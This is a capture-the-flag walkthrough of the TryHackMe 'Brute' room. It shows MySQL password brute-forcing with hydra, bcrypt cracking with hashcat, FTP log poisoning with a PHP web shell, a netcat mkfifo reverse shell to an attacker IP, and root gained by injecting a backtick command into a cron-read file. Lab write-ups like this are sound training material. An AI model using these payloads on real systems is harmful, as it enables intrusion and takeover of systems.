## **Description**

Hello hackers, I hope you are doing well. We are doing [Brute](https://tryhackme.com/room/ettubrute) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

We found 4 open ports:

 - 21/tcp vsftpd 3.0.3
 
 - 22/tcp OpenSSH 8.2p1

 - 80/tcp Apache httpd 2.4.41

 - 3306/tcp MySQL 8.0.28


### Web

Let's navigate to the web server.

![](1.png)

We found a login page, i tried submitting some default credentials as well as trying a sql injection but no luck.

### MySql

We found a mysql server exposed on port 3306, so let's try and brute force the password for user root.

### Hydra

We're going to `hydra` with the following options:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.117.23 mysql
```

![](2.png)

Great! We got root password, let's connect to the server and see what can we find.

```terminal
$ mysql -u root -h 10.10.117.23 -p

```

We found a database called `website` with a table called `users` that has a username and a password hash.

### Hash Cracking

Let's put the hash into a file and crack it using `hashcat`.

#### Hashcat

First we need to identify the hash type:

```bash
$ hashcat -h | grep -i '$2'                                           
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
             
```

It's a `bcrypt` hash and we'll be using the mode `3200` to crack it.

```bash
└──╼ $ hashcat -m 3200 adrian.txt /usr/share/wordlists/rockyou.txt

```

Great! We got the password, now let's go to the web page and login.

![](3.png)

We're logged in successfully and it seems we view some log file, but when we press `log` button nothing appears.

We have so far interacted with mysql server and the web server, so the log file is for the other two services left, which are ssh and ftp. Let's try connecting with those two services using the name `SSHuser` for ssh and `FTPUSER` for ftp and see if something appears in the log file.

![](4.png)

Great! We confirmed that the log file we're seeing is for ftp. 

## **Foothold**

To get a foothold into the machine, we're gonna use a techniques called `log poisoning` where we're gonna poison this ftp log by injecting a php code that would allow us to execute command on the target system.

To do that we're gonna connect to the ftp server and supply the following php code `<?php system($_GET['c']); ?>` as the user.

![](5.png)

Now using `curl`, we're gonna request the log file and add a `c` parameter at the end of the url that would have the command we want to execute.

```bash
curl 'http://10.10.117.23/welcome.php?c=id' -X POST -d 'log=Log' -b "PHPSESSID=o043dgfcg7efu1eb06v5ouk81u" -H "Content-Type: application/x-www-form-urlencoded" 
```


> NOTE: You have to change the PHPSESSID value to the one you have.

![](6.png)

Great! We managed to execute code.

Now Let's get a reverse shell using the following command:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.14.124 1234 >/tmp/f
```

But before that, we need to URL encode it first.

```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.11.14.124%201234%20%3E%2Ftmp%2Ff
```

Now setup a listener and send the command using `curl`.

```bash
curl 'http://10.10.117.23/welcome.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.11.14.124%201234%20%3E%2Ftmp%2Ff' -X POST -d 'log=Log' -b "PHPSESSID=o043dgfcg7efu1eb06v5ouk81u" -H "Content-Type: application/x-www-form-urlencoded"
```

![](7.png)

We got the shell, and we can stabilize it using python pty.

## **Privilege Escalation**

If we check `adiran`'s home directory, we find one readable file.

![](8.png)

It says rule best of 64 + exclamation.

Searching on google we find that best64 is a rule used by password cracking tools (john, hashcat) for creating custom password lists.

![](9.png)

Let's generate the password list.

```bash
$ echo 'ettubrute' > word.txt # add the word 'ettubrute' to the file we'll be using to generate the list from.

$ hashcat --force word.txt -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_words.txt #generate the wordlist with best64 rule.

$ sed -i 's/$/!/' hashcat_words.txt #add exclamation point at the end of every word.
```

Now let's brute force adrian's ssh password with `hydra` using the new list.

![](10.png)

We got the password, now let's ssh into the machine.

![](11.png)

On adrian's home directory, we find an ftp directory with some interesting stuff.

![](12.png)

First we see that adrian has been ordered by his admin to check in every minute by writing on a punch card, which is a file that we can clearly see at adrian's home directory.

![](13.png)

The file get's updated every minute and this is because a cronjob that's running the file shell script `punch_in.sh` every minute.

Seconde, adrian has been told to write the following script that the admin would use the make sure adrian is checking in every minute.

```bash
#!/bin/sh          
while read line;   
do                 
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

This script reads the `punch_in` file line by line and passes every line to the command `/usr/bin/sh -c "echo $line"`.

As we did with the ftp log file, we're gonna inject a command to the `punch_in` file so that when the admin runs the script our command would get executed like the following:

```bash
drian@brute:~$ /usr/bin/sh -c "echo `uname -a`"
Linux brute 5.4.0-89-generic
```

The command I'll be injecting will give `/bin/bash` suid permission so that we can run it as root.

```bash
'chmod +s /bin/bash'
```


>Note the backtick at the start and the end of the command.

Now we add that to the file and wait.

![](14.png)

Congratulations, we got root.
